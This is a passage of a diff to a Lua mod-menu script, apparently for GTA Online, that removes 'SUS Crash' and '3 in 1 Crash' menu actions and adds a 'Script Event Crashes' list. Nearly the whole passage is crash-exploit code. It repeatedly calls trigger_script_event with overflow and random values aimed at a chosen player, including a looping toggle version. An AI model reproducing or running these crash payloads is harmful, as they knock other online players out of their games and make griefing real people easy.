-menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("footlettucecrash"..PLAYER.GET_PLAYER_NAME(pid))
-            end)
-
-    menu.toggle_loop(ncrash, "3 in 1 Crash", {"toggle3in1"}, "Sends stands elegant, next-gen, burger king foot lettuce and vehicle manslaughter all at once", function(on_toggle)
-    notification("3in1 Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("footlettucecrash"..PLAYER.GET_PLAYER_NAME(pid))
-            end)
 
 local vehcrash = menu.list(crash, "Vehicle Crash", {}, "")
 
@@ -11202,420 +11460,231 @@ menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
 menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
     menu.trigger_commands("2t1spec" .. PLAYER.GET_PLAYER_NAME(pid))
             end)
-
             
-    local suscrash = menu.list(crash, "SUS Crash", {}, "")
 
-    	menu.action(suscrash, "SUS Crash", {"suscrash"}, "", function()
-    	notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        		local int_min = -2147483647
-        		local int_max = 2147483647
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
-            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
-        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
-        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
-        			end
-        			util.yield()
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
-        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
-        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
-        			end
-        	menu.trigger_commands("givesh" .. players.get_name(pid))
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
-        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
-        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-    	notification("SUS Crash" .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-    			end)
+            local scrash = menu.list(crash, "Script Event Crashes", {}, "")
 
-    	menu.toggle_loop(suscrash, "SUS Crash", {"togglesuscrash"}, "", function(on_toggle)
-    	notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        		local int_min = -2147483647
-        		local int_max = 2147483647
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
-            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
-        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
-        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
